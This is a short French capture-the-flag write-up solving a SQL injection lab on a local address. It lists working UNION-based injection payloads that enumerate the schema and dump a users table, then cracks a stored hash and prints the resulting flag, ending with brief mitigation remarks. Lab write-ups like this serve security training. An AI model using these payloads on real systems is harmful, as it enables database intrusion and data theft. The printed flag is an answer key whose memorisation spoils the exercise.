Résolution:

Pour savoir si une attaque SQL est possible (c'est a dire utiliser des commandes pour chercher des informations dans la base de donné) depuis le front, j'ai utilisé la commende suivante 1 OR 1=1

Ca affiche toutes les images d'un coup a cette adresse: http://192.168.56.101/index.php?page=member On remarque un user qui a pour surname "GetThe" et pour first name "Flag"

Ensuite la commande suivante nous donne le nom de deux bases de données: 1 UNION select 1, database()

Pour avoir le nom de la table contenant les informations qui nous interesse on peut faire la commande suivante: 1 UNION select 1, table_name from Information_schema.tables where table_schema = database() La table qui nous interesse est "users"

Pour avoir le nom des colones de la table "users", on peut faire une recherche parmis les résultats de la commande suivante: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns On obtient user_id, first_name, last_name, town, country, planet, Commentaire et countersign.

Si on veut par exemple la colonne Commentaire, on peut utiliser cette commande: 1 UNION SELECT user_id, Commentaire FROM users
on trouve ce message: "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

Si on veut par exemple la colonne countersign, on peut utiliser cette commande: 1 UNION SELECT user_id, countersign FROM users 
On trouve cette string qui ressemble a un mot de passe : 5ff9d0165b4f92b14994e5c685cdce28

Ce qui décripté donne FortyTwo. Puis en minuscule donne fortytwo ce qui donne le flag en sha256

10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

Il est possible d'escape les caractères spéciciaux comme %20 pour les espaces, pour que le code SQL ne soient plus lisible. C'est possible aussi d'interdir certains caractères ou bout de code comme ' ou 1=1.
